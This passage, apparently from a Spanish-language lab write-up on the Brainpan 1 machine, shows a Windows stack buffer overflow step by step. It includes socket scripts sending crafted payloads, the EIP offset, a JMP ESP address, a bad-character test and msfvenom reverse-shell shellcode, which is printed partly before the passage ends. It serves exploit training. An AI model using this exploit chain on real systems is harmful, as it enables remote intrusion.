        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="n">p1</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Cadena enviada"</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python2 buffer.py
<span class="o">[</span>+] Buffer Overflow: Cadena enviada
</code></pre></div></div>

<p>Ahora si observamos en <strong>Immunity Debugger</strong> tenemos un valor para el registro <strong><em>EIP</em></strong> el cual vamos a copiar:</p>

<p><img src="/assets/images/vh-brainpan1/brainpan1-debugger1.png" alt="" /></p>

<p>Tenemos el valor <code class="language-plaintext highlighter-rouge">335724134</code> el cual, mediante la herramienta <code class="language-plaintext highlighter-rouge">pattern_offset</code> vamos a determinar el valor del buffer antes de modificar el valor del registro <strong><em>EIP</em></strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb <span class="nt">-l</span> 600 <span class="nt">-q</span> 35724134
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 524
</code></pre></div></div>

<p>Entonces tenemos que el valor es 524 de <em>basura</em> (en este caso el caracter <strong>A</strong>) y si estamos en lo correcto, si agregamos 4 letras <strong>B</strong>, el registro <strong>EIP</strong> valdría 42424242 (el valor de <strong>B</strong> en hexadecimal es 42). Vamos a comprobarlo.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
#coding:utf-8
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">signal</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span><span class="n">frame</span><span class="p">):</span>
    <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[!] Saliendo..."</span>
    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span><span class="n">def_handler</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Buffer Overflow"</span><span class="p">)</span>
    <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Generando cadena a través de un patrón"</span><span class="p">)</span> 
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">junk</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">524</span> <span class="o">+</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">4</span>
    <span class="n">server_address</span> <span class="o">=</span> <span class="p">(</span><span class="s">'10.0.0.30'</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># Create a TCP/IP socket
</span>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="c1"># Connect the socket to the port where the server is listening
</span>        <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server_address</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">junk</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="n">p1</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Cadena enviada"</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/images/vh-brainpan1/brainpan1-debugger2.png" alt="" /></p>

<p>Ya tenemos el control del valor del registro <strong>EIP - Extended Instruction Pointer</strong>. Dicho registro indica al programa cual es la siguiente instrucción y debido que hemos cambiando su valor, el programa no sabe que debe ejecutar a continuación y por eso crashea. Si queremos aprender un poco más de los registros y del ataque de <strong><em>Buffer Overflow</em></strong> podemos consultar el siguiente recurso <a href="https://blog.softtek.com/es/explotaci%C3%B3n-de-software-en-arquitecturas-x86-i-introducci%C3%B3n-y-explotaci%C3%B3n-de-un-buffer-overflow">softtek</a>.</p>

<p>Ahora debemos determinar si tenemos espacio suficiente para tratar de inyectar comandos; por lo tanto, vamos a mandar el <strong>junk</strong> (524 <strong>A</strong>) más el <strong>EIP</strong> (4 caracteres) más 600 <strong>C</strong>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
#coding:utf-8
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">signal</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span><span class="n">frame</span><span class="p">):</span>
    <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[!] Saliendo..."</span>
    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span><span class="n">def_handler</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Buffer Overflow"</span><span class="p">)</span>
    <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Generando cadena a través de un patrón"</span><span class="p">)</span> 
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">junk</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">524</span> <span class="o">+</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="s">"C"</span><span class="o">*</span><span class="mi">600</span>
    <span class="n">server_address</span> <span class="o">=</span> <span class="p">(</span><span class="s">'10.0.0.30'</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># Create a TCP/IP socket
</span>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="c1"># Connect the socket to the port where the server is listening
</span>        <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server_address</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">junk</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="n">p1</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Cadena enviada"</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/images/vh-brainpan1/brainpan1-debugger3.png" alt="" /></p>

<p>Vemos que nuestras <strong>C</strong> sobreescriben el registro <strong>ESP</strong>, esto significa que se puede usar una dirección <strong>ESP JMP</strong> para redirigir la ejecución a <strong>ESP</strong>, que contendrá el shellcode malicioso.</p>

<p>Por lo tanto, debemos encontrar una dirección de instrucción <strong>JMP ESP</strong> válida para que podamos redirigir la ejecución de la aplicación a nuestro código malicioso o shellcode; lo anterior lo lograremos con <strong>mona</strong> cuyo script lo podemos descargar en <a href="https://github.com/corelan/mona">Github</a> y lo colocamos en la ruta <code class="language-plaintext highlighter-rouge">C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands</code>.</p>

<p>Abrimos <strong>Immunity Debugger</strong>, corremos el programa y en la parte inferior, vemos que podemos ejecutar algunos comandos y escribimos <code class="language-plaintext highlighter-rouge">!mona modules</code>:</p>

<p><img src="/assets/images/vh-brainpan1/brainpan1-debugger4.png" alt="" /></p>

<p>Vemos que el propio ejecutable <code class="language-plaintext highlighter-rouge">brainpan.exe</code> no cuenta con protecciones y ahora vamos a ver cual es la dirección de instrucción <strong>JMP ESP</strong> ejecutando <code class="language-plaintext highlighter-rouge">!mona assemble -s "JMP ESP"</code>:</p>

<p><img src="/assets/images/vh-brainpan1/brainpan1-debugger5.png" alt="" /></p>

<p>Tenemos el valor FFE4, por lo que vamos a buscar el valor correspondiente de dirección con el comando<code class="language-plaintext highlighter-rouge">!mona find -s "\xff\xe4" -m brainpan.exe</code>:</p>

<p><img src="/assets/images/vh-brainpan1/brainpan1-debugger6.png" alt="" /></p>

<p>Tenemos el valor 0x311712F3. Podemos validarlo al darle doble click en dicho valor y nos arroja que está asociado a <strong>JMP ESP</strong>. Ahora solo nos falta generar nuestra shellcode para entablarnos una reverse shell; pero antes, vamos a checar si existen caracteres que no le gusten o conocidos como <strong><em>Bad Chars</em></strong>:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
#coding:utf-8
</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span><span class="p">,</span> <span class="n">time</span><span class="p">,</span> <span class="n">signal</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span><span class="n">frame</span><span class="p">):</span>
    <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[!] Saliendo..."</span>
    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span><span class="n">def_handler</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Buffer Overflow"</span><span class="p">)</span>
    <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="s">"Generando cadena a través de un patrón"</span><span class="p">)</span> 
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span>
        <span class="s">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x21\x22\x23\x24\x27\x28\x29\x2a\x2c\x2d\x2e\x2f\x30</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3e\x3f\x40</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0</span><span class="s">"</span>
        <span class="s">"</span><span class="se">\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"</span> <span class="p">)</span>
    <span class="n">junk</span> <span class="o">=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">524</span>
    <span class="n">eip</span> <span class="o">=</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">4</span>
    <span class="n">bof</span> <span class="o">=</span> <span class="n">junk</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">badchars</span>
    <span class="n">server_address</span> <span class="o">=</span> <span class="p">(</span><span class="s">'10.0.0.30'</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># Create a TCP/IP socket
</span>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="c1"># Connect the socket to the port where the server is listening
</span>        <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server_address</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">bof</span><span class="p">)</span>
        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
        <span class="n">p1</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Cadena enviada"</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
        <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/images/vh-brainpan1/brainpan1-debugger7.png" alt="" /></p>

<p>Vemos que acepta todos los caracteres (se omitio <code class="language-plaintext highlighter-rouge">\x00</code> debido a que casi siempre se considera un <strong><em>Bad Char</em></strong>). Por lo tanto, ya podemos crear nuestro shellcode:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nt">--platform</span> Windows <span class="nt">-a</span> x86 <span class="nv">lhost</span><span class="o">=</span>10.0.0.25 <span class="nv">lport</span><span class="o">=</span>443 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> python <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span>
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf <span class="o">=</span>  b<span class="s2">""</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">cc"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">53"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">45</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">87</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">a6</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">54"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">fb</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">1e</span><span class="se">\x</span><span class="s2">a9</span><span class="se">\x</span><span class="s2">d6</span><span class="se">\x</span><span class="s2">ed</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">6c</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">6e"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">c5</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">bd</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">d6</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">fd</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">22</span><span class="se">\x</span><span class="s2">64"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">27</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">a1</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">ca</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">7a</span><span class="se">\x</span><span class="s2">9a</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">d6"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">f3</span><span class="se">\x</span><span class="s2">14</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">a2</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">a0</span><span class="se">\x</span><span class="s2">22"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">45</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">25</span><span class="se">\x</span><span class="s2">d6</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">92</span><span class="se">\x</span><span class="s2">b7</span><span class="se">\x</span><span class="s2">3e"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">1b</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">a9</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">56"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">a1</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">8e</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">6c"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">3c</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">21</span><span class="se">\x</span><span class="s2">dc</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">e9</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">67"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">3d</span><span class="se">\x</span><span class="s2">d4</span><span class="se">\x</span><span class="s2">2d</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">ed</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">18</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">da"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">b7</span><span class="se">\x</span><span class="s2">91</span><span class="se">\x</span><span class="s2">ef</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">ca</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">96</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">78"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">71</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">1f</span><span class="se">\x</span><span class="s2">2b</span><span class="se">\x</span><span class="s2">1d</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">c3"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">f4</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">b2</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">92</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">68"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">1a</span><span class="se">\x</span><span class="s2">14</span><span class="se">\x</span><span class="s2">3e</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">b4</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">b8</span><span class="se">\x</span><span class="s2">97</span><span class="se">\x</span><span class="s2">4f"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">7b</span><span class="se">\x</span><span class="s2">e7</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">70</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">a5</span><span class="se">\x</span><span class="s2">b3</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">db"</span>
buf +<span class="o">=</span> b<span class="s2">"</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">9a</span><span class="se">\x</span><span class="s2">3f</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">b6</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">74"</span>
